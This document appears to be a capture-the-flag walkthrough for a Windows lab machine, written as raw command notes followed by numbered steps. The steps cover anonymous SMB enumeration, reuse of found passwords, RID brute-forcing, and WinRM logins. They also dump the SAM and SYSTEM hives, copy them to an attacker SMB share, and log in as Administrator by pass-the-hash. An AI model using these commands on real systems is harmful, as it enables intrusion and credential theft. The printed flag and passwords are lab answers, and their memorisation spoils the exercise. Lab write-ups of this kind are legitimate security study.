```
smbclient \\\\10.10.11.35\\DEV -U 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
--------------------------------------------------------------------
cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
--------------------------------------------------------------------
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
----------------------------------------------
user.txt: 1d12de2c4162688e2ee9ba080c707d96
-----------------------------------------------------
reg save hklm\system c:\Temp\system


copy C:\Temp\sam \\10.10.16.53\share\sam
copy C:\Temp\system \\10.10.16.53\share\system

evil-winrm -i 10.10.11.35 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```


## **Initial Access**
1. **Enumerate SMB Shares**:
   - Used `smbclient` to list accessible shares:
     ```bash
     smbclient -L \\\\10.10.11.35 -U "anonymous"
     ```
   - Found the `HR` share and accessed it:
     ```bash
     smbclient \\\\10.10.11.35\\HR -U "anonymous"
     ```

2. **Found Credentials**:
   - Discovered a file containing credentials:
     ```
     Cicada$M6Corpb*@Lp#nZp!8
     ```

3. **Enumerate Users**:
   - Used `nxc` to enumerate users via RID brute-forcing:
     ```bash
     nxc smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute
     ```
   - Identified users like `michael.wrightson`, `david.orelious`, and `emily.oscars`.

4. **Authenticate as `michael.wrightson`**:
   - Used the found credentials to authenticate:
     ```bash
     nxc smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
     ```

5. **Explore SMB Shares**:
   - Found additional shares and accessed the `dev` share:
     ```bash
     smbclient \\\\10.10.11.35\\dev -U 'michael.wrightson%'Cicada$M6Corpb*@Lp#nZp!8'
     ```

6. **Found New Credentials**:
   - Discovered credentials for `emily.oscars`:
     ```
     emily.oscars:Q!3@Lp#M6b*7t*Vt
     ```

7. **Authenticate as `emily.oscars`**:
   - Used `evil-winrm` to authenticate:
     ```bash
     evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
     ```


## **Privilege Escalation**
1. **Check Privileges**:
   - Ran `whoami /priv` and found `SeBackupPrivilege` and `SeRestorePrivilege` enabled.

2. **Dump SAM and SYSTEM Hives**:
   - Created a `Temp` folder and dumped the hives:
     ```powershell
     cd c:\
     mkdir Temp
     reg save hklm\sam c:\Temp\sam
     reg save hklm\system c:\Temp\system
     ```

3. **Transfer Files Using SMB Server**:
   - Set up an SMB server on the attacking machine:
     ```bash
     sudo impacket-smbserver share $(pwd) -smb2support
     ```
   - Copied the files to the SMB share from the target machine:
     ```powershell
     copy C:\Temp\sam \\<Your_IP>\share\sam
     copy C:\Temp\system \\<Your_IP>\share\system
     ```

4. **Extract NTLM Hashes**:
   - Used `pypykatz` to extract the hashes:
     ```bash
     pypykatz registry --sam sam --system system
     ```
   - Found the NTLM hash for the `Administrator`:
     ```
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
     ```

5. **Authenticate as `Administrator`**:
   - Used `evil-winrm` with the NTLM hash:
     ```bash
     evil-winrm -i 10.10.11.35 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
     ```

6. **Retrieve the Root Flag**:
   - Navigated to the `Administrator` desktop and read the `root.txt` file:
     ```powershell
     cd C:\Users\Administrator\Desktop
     type root.txt
     ```

